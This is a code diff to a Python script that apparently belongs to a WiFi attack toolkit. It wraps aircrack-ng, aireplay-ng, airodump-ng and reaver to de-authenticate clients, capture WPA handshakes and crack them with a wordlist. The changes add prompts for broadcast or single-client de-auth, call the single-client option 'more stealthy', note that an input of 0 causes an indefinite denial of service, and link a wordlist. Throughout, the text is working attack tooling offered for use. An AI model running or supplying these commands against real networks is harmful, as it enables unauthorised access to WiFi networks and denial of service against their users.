@@ -909,6 +909,7 @@ def reaver():  #Needs major overhaul
         ack = input("[?] Type 'y' to continue>>")
         if ack.lower().startswith('y'):
             print("[-] Checking for dependancies")
+            print("[-] 5% done")
             reaverspecialdeps()
             #check_depends()
             print("[-] All dependancies are met ma dude. Make sure you have correct drivers! ")
@@ -957,9 +958,10 @@ def reaver():  #Needs major overhaul
                     print("\n[info] By now it has either worked or not. If it hasn't, well then i'm sorry. Please use the fix/aircrack-ng approach instead or if it has then CONGRATS ON FINDING THE PSK!")        
                     clearScreen()
                 if opt == "2":
-                    os.system("xterm $HOLD -title 'CLOSE ME ONCE DONE'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e aireplay-ng -1 30 -a %s %s&reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
-                    print("\n[info] By now it has either worked or not. If not then I'm sorry or if it has then CONGRATS ON FINDING THE PSK!")
-                    print("\n[info] Please close the Xterm at the top right now, as keeping it on is pretty much useless!")
+                    os.system("xterm $HOLD -title 'ASSOCIATING WITH AP'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -geometry +2160 -e aireplay-ng -1 30 -a %s %s&reaver -i %s -b %s -K 1 -vvv -c %s -N -A " %(b,index,index,b,c))
+                    print("\n[info] By now it has either worked or not. If not then please try option [1]")
+                    os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
+                    #print("\n[info] Please close the Xterm at the top right now, as keeping it on is pretty much useless!")
                     clearScreen()
                 else:
                     os.system("clear")
@@ -1004,11 +1006,11 @@ def aircrackng(): #Lots of effort needed
 
 [info] Developed by Sh3llCod3, Using the Aircrack-ng tool. 2017-2020. Use with legal caution, disclaimer applies.                                                                                  
     """)
-                os.system("echo 'Starting...'")
+                #os.system("echo 'Starting...'")
                 if os.system("ls -l HANDSHAKES/ 2>/dev/null >/dev/null") != 0:
                     os.system("mkdir HANDSHAKES")
-                print("\nHi, welcome to aircrack-ng made easy")
-                print("Please read everything that appears at the bottom")
+                #print("\nHi, welcome to aircrack-ng made easy")
+                print("\nHi, Please read everything that appears at the bottom")
                 print("Thanks for using this program")
                 os.system("sudo systemctl stop NetworkManager.service")
                 os.system("sudo systemctl stop wpa_supplicant.service")
@@ -1019,29 +1021,30 @@ def aircrackng(): #Lots of effort needed
                 index = input("[?] What card shall I put in monitor-mode/use? (copy/paste) >> ")
                 index = str(index)
                 os.system("ip link set %s down;iw dev %s set type monitor;ip link set %s up" %(index,index,index))
-                print("[info] 1) Ok, seems like %s is started, time to get crackin'" %(index))
+                print("\n[info] 1) Ok, seems like %s is in monitor mode" %(index))
                 print("[info] 2) now, we'll run Airodump-ng to capture the handshake")
-                input("[info] 3) once you start airodump, you need to press ctrl+c when you see your target network. \n\n[?] press enter to continue >>")
+                input("[info] 3) once you start airodump, you need to press CTRL+C when you see your target network. \n\n[?] press enter to continue >>")
                 os.system("airodump-ng -a %s" %(index)) 
-                print("Ok, all I need is a few things from you")
-                b = input("[?] First, we'll create a new file to store the key in. What shall I call it? [no spaces/MAC addresses]>>")
+                print("\nOk, all I need is a few things from you")
+                b = input("[?] First, we'll create a new file to store the key in. What shall I call it? [no spaces/MAC addresses]>> ")
                 b = str(b)
-                c = input("[?] Now, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>>")
+                c = input("[?] Now, tell me the (copy/paste) channel {look at CH column} of the network [no spaces]>> ")
                 c = str(c)
-                d = input("[?] Finally tell me the (copy/paste) bssid of the network [no spaces]>>")
+                d = input("[?] Finally tell me the (copy/paste) bssid of the network [no spaces]>> ")
                 d = str(d)
                 if b and c and d != "":
-                    print("[info] Now, the idea is when someone connects/reconnects, we grab the password")
-                    print("[info] That's why we need to disconnect someone. You dont have to, you can wait for someone to connect or connect manually")
-                    print("[info] You can leave it blank to not disconnect anyone")
-                    e = input("\n[?] How many de-auths/disconnects shall I send? Don't use '0'! >>")
+                    os.system("clear")
+                    #print("[info] Now, the idea is when someone connects/reconnects, we intercept the handshake to crack later.")
+                    print("[info] We need to de-auth someone. We don't have to, you can wait for someone to connect.")
+                    #print("[info] You can leave it blank to not disconnect anyone")
+                    e = input("\n[?] De-auth all [type a], de-auth client [type c], don't de-auth [type n]  ~# ")
                     e = str(e)
                     def post_frame():
-                        print("\n[info] If you saw [WPA HANDSHAKE: %s] at the top right,then its time to crack the handshake." %(d))
-                        print("[info] First make sure you have a wordlist which has the password in it ")
-                        print("[info] Please download or locate one ")
-                        print("[info] Hopefully the password will be in there or put it in there")
-                        input("\n[+] Please Specify wordlist. Press enter to open file selection>>")
+                        print("\n\n[info] If you saw [WPA HANDSHAKE: %s] at the top right, then its time to crack the handshake." %(d))
+                        print("[info] We need a wordlist. You can download one from here: https://goo.gl/3UoZ34")
+                        #print("[info] Please download or locate one ")
+                        #print("[info] Hopefully the password will be in there or put it in there")
+                        input("\n[+] Please Specify wordlist. Press [enter] to open file selection  ~# ")
                         def wordlist():
                             from tkinter.filedialog import Tk
                             from tkinter.filedialog import askopenfilename
@@ -1050,55 +1053,71 @@ def aircrackng(): #Lots of effort needed
                             f = askopenfilename()
                             f = str(f)
                         wordlist()
-                        print("[info] Ok, ready? press enter to start cracking")
-                        print("[info] If nothing is found then ctrl+c and try again")
-                        input("[press enter]>>")
+                        os.system("clear")
+                        print("\n[CAP FILE]: HANDSHAKES/%s-01.cap" %(b))
+                        print("[WORDLIST]: %s" %(f))
+                        #print("[info] Ok, ready? press enter to start cracking")
+                        #print("[info] If nothing is found then ctrl+c and try again")
+                        input("\nPress [enter] ~# ")
                         os.system("aircrack-ng HANDSHAKES/%s-01.cap -w %s" %(b,f))
-                        print("\n\n[+] LOOK AT KEY FOUND, THAT'S THE PASSWORD. WRITE IT DOWN!")
-                        print("[+] CONGRATS IF YOU FIND THE PSK!")
+                        print("\n\n[+] If you see 'KEY FOUND:XXXXXXX', that's the PSK.")
+                        print("[+] If the passphrase was not in the dictonary then try option [10] using hashcat.\n")
                         clearScreen()
                     def standard():
                         os.system('clear')
-                        input("\n[?] PRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! [press enter]>>" %(d))
+                        global stda 
+                        print("[info] How many de-auths do you want to send to the client: %s? Typing '0' will de-auth indefinitely, creating a denial of service." %(g))
+                        stda = input("\nPlease enter a number. Around 3-5 is sufficient for a good WiFi-card. ~# ")
+                        input("\n[?] ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C. \n\n[PRESS ENTER]  ~# " %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
-                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one;airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s" %(e,d,g,index,b,c,d,index))
+                        os.system("xterm -geometry 100x30+4320 -title 'DEAUTHING: %s & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s -c %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(g,stda,d,g,index,b,c,d,index))
                         post_frame()
                     def broadcast_deauth():
                         os.system('clear')
-                        input("\n[?] PRESS ENTER TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C!! THIS IS VITAL!! \n[press enter]>>" %(d))
+                        global brda 
+                        print("[info] How many de-auths do you want to send to all? Typing '0' will de-auth indefinitely, creating a denial of service.")
+                        brda = input("\nPlease enter a number. Around 3-5 is sufficient for a good WiFi-card. ~# ")
+                        input("\n[?] ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C. \n\n[PRESS ENTER]  ~# " %(d))
                         os.system("iwconfig %s channel %s" %(index,c))
-                        os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %s --ignore-negative-one;airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s" %(e,d,index,b,c,d,index))
+                        os.system("xterm -geometry 100x30+4320 -title 'DEAUTHING ALL & CAPTURING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e 'aireplay-ng -0 %s -a %s %s --ignore-negative-one && airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(brda,d,index,b,c,d,index))
                         post_frame()
                     def no_deauth():
                         os.system('clear')
-                        print("[info] Ok, you have chosen not to disconnect anyone.")
-                        print("[info] You need to wait for someone to connect or connect manually yourself")
-                        input("[info] Ready? Hit enter to run. When you see WPA HANDSHAKE:%s at the top right press ctrl+c>>" %(d))
+                        print("\n[info] You have chosen not to disconnect anyone.")
+                        print("[info] You need to wait for someone to connect.")
+                        input("\n[info] READY? HIT [ENTER] TO RUN. ONCE YOU SEE WPA HANDSHAKE:%s AT THE TOP RIGHT PRESS CTRL+C. ~# " %(d))
                         os.system("\niwconfig %s channel %s" %(index,c))
-                        os.system("\nairodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s" %(b,c,d,index))
+                        os.system("xterm -geometry 100x30+4320 -title 'WAITING FOR HANDSHAKE' -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng -w HANDSHAKES/%s -c %s --bssid %s --ignore-negative-one %s'" %(b,c,d,index))
                         post_frame()
                     def sta():
+                        os.system("xterm -title 'COPY/PASTE: HIGHLIGHT & CLICK SCROLL WHEEL OR LB+RB' -geometry 110x30+4320+7640 -bg '#FFFFFF' -fg '#000000' -e 'airodump-ng --bssid %s -c %s --ignore-negative-one %s' &" %(d,c,index))
                         global g
-                        print("\n[info] Look at the second column where it says bssid/station.")
-                        print("[info] If you don't have that then leave you'll have to de-auth everyone or not de-auth by leaving it blank.")
-                        print("[info] You can copy/paste a station address to de-auth/disconnect a specific device rather than all devices on the network")
+                        print("\n[info] In the XTERM at the bottom right, look at the column where it says bssid/station.")
+                        #print("[info] If you don't have that then leave you'll have to de-auth everyone or not de-auth by leaving it blank.")
+                        print("[info] You can choose a station address to de-auth/disconnect a specific client rather than all devices on the network")
                         print("[info] This is more stealthy as only one device is being disconnected.")
-                        print("[info] please ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
-                        print("It is optional but you can also leave this blank if you still don't get it")
-                        g = input("\n[?] Please copy/paste station (address) here or leave blank>>")
+                        #print("[info] please ensure that the station (address) you copy/paste is connected to the the bssid you copied earlier [Look in the bssid column]")
+                        #print("It is optional but you can also leave this blank if you still don't get it")
+                        g = input("\n[?] Please copy/paste a station address and hit enter. ~# ")
+                        os.system("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                         g = str(g)
-                    if e == "":
+                    if e.lower().startswith("n"):
                         no_deauth()
-                    else:
+                    elif e.lower().startswith("a"):
+                        broadcast_deauth()
+                    elif e.lower().startswith("c"):
                         sta()
-                        if e != "" and g != "":
-                            standard()
-                        elif e != "" and g == "":
-                            broadcast_deauth()
-                        else:
-                            no_deauth()
+                        standard()
+                    #else:
+                    #    sta()
+                    #    if e != "" and g != "":
+                    #        standard()
+                    #    elif e != "" and g == "":
+                    #        broadcast_deauth()
+                    #    else:
+                    #        no_deauth()
                 else:
-                    input("[-] You missed something, try again, \n[press enter]>>")
+                    input("[-] You missed something, try again. \n[press enter] ~# ")
                     mainScreen()
             mainScreen()
         except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
@@ -1107,7 +1126,7 @@ def aircrackng(): #Lots of effort needed
             os.system("sudo systemctl start NetworkManager.service")
             os.system("sudo systemctl start wpa_supplicant.service")
             os.system("clear")
-            if input("\n[-] Press [y] to exit or any other key to return to start>>").lower().startswith("y"):
+            if input("\n[-] Press [y] to exit or any other key to return to start  ~# ").lower().startswith("y"):
                 os.system("rm log.txt 2>/dev/null")
                 os._exit(1)
             else:
